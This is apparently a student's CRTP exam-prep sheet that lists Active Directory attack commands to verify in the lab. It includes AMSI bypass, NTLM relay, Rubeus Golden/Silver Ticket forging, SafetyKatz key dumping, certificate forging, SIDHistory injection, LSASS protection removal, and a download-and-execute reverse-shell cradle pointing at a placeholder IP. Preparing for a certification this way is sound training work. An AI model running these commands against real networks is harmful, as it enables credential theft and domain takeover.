# 10 — Ambiguous Handwriting / Verify Before Exam

> [!WARNING]
> The following commands contain handwriting variations or tool-version dependencies from the original PDF. Expected syntaxes and standard fallback options are provided below for immediate lab verification.

---

## Lab Verification Matrix

| Page # | Item / Command to Verify | Expected Standard Syntax & Fallback Options |
| :---: | :--- | :--- |
| **8–9** | Script patching (`BytePatchNumbers.ps1`) & AMSI bypass | Use `DefenderCheck.exe <File>` to find flagged strings.<br>Fallback: Use `Invisi-Shell` (`RunWithPathAsAdmin.bat`) or string obfuscation. |
| **16** | Share enumeration script (`PowerHuntShares`) | PowerView native: `Find-DomainShare`<br>Fallback: `Invoke-ShareFinder` or SharpHound collection. |
| **18–19** | `htmlrelayx.py` / `ntlmrelayx.py` flags | `python3 ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>`<br>Fallback: `impacket-ntlmrelayx -t smb://<TARGET_IP> -c "whoami"` |
| **19** | `gpowritty.py` / GPO write tool | Modify GPO DACL via BloodHound / `Add-DomainObjectAcl`<br>Fallback: `Set-GPPPassword` or manual GPO edit via GPMC if RSAT installed. |
| **19–20** | SMB / GPO staging share copy syntax | `xcopy /E /I C:\StagedGPO \\<DC_IP>\SYSVOL\<DOMAIN>\Policies\<GPO_GUID>` |
| **25** | Jenkins AMSI-bypass / SubLogon helper | Load payload into memory via base64 encoded string or web download: `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1')"` |
| **26–31** | `Loader.exe` parameters & SafetyKatz arguments | `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::ekeys" "exit"` |
| **31** | Rubeus Golden Ticket parameters | `Rubeus.exe golden /aes256:<KRBTGT_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd` |
| **32** | Silver Ticket HOST / RPCSS for WMI | `Rubeus.exe silver /service:host/<TARGET_FQDN> /aes256:<KEY> /sid:<SID> /user:Administrator /ptt`<br>`Rubeus.exe silver /service:rpcss/<TARGET_FQDN> /aes256:<KEY> /sid:<SID> /user:Administrator /ptt` |
| **34–36** | `sc.exe` remote service payload | `sc.exe \\<TARGET> create <SVC_NAME> binPath= "C:\Windows\temp\svc.exe" start= auto`<br>`sc.exe \\<TARGET> start <SVC_NAME>` |
| **39–40** | Kekeo / Rubeus S4U syntax | `Rubeus.exe s4u /user:<DELEGATED_USER> /aes256:<KEY> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt` |
| **47** | Rubeus certificate TGT request (PKINIT) | `Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<PFX_PATH> /password:<PFX_PASS> /ptt` |
| **49–50** | `ForgeCert.exe` options | `ForgeCert.exe --CaCertPath <CA_PFX> --CaCertPassword <PASS> --Subject "CN=Administrator" --SubjectAltName Administrator@domain --NewCertPath <OUT_PFX> --NewCertPassword <PASS>` |
| **51** | `DSInternals` SIDHistory injection | `Add-ADDBSidHistory -SamAccountName <USER> -SidHistory <SID> -DatabasePath C:\Windows\NTDS\ntds.dit` |
| **52** | PSReadLine history path | `C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| **57** | Mimikatz PPL driver removal | `mimikatz # privilege::debug`<br>`mimikatz # !drv::install C:\AD\Tools\mimidrv.sys`<br>`mimikatz # !processprotect /process:lsass.exe /remove` |

---

## Recommended Exam Pre-Check Strategy

> [!TIP]
> Before beginning your CRTP exam attempt, run through these items in the provided lab environment. Verify tool path locations (`C:\AD\Tools\`) and CLI parameters for your specific lab setup.
